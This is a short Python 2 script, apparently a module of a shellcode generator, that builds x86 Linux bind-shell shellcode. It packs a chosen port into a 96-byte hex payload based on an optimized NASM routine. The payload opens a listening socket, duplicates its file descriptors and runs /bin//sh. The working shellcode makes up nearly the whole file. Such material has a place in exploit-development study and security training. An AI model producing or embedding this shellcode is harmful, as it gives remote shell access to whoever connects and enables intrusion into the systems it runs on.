#!/usr/bin/env python
import struct
import socket
from trexshellz import args_port

#bind shell module
#specify ports greater than 256 to avoid null bytes!
port = '\\x' + '\\x'.join(x.encode('hex') for x in struct.pack('>H',args_port))
print "port after struct pack: " + port

#shellcode below is based off of "bind-shell_optimized.nasm" version 1.0
#could probably use additional optimization but it's at 96 bytes right now
code = ["\\x31\\xdb\\xf7\\xe3\\x50\\x6a\\x01\\x6a\\x02\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x89\\xc6\\x52\\x52\\x66\\x68",
        port,
        "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x52\\x56\\x89\\xe1\\xb3\\x04\\xb0\\x66\\xcd\\x80\\x52\\x52\\x56\\x89\\xe1\\xfe\\xc3\\xb0\\x66\\xcd\\x80\\x31\\xc9\\x89\\xc3\\xb1\\x03\\xfe\\xc9\\xb0\\x3f\\xcd\\x80\\x75\\xf8\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80",
]

#better way to print list as one string?
sc = ''.join(code)

print "shellcode: " + sc

#print('shellcode: {!r}.'.format(str1))

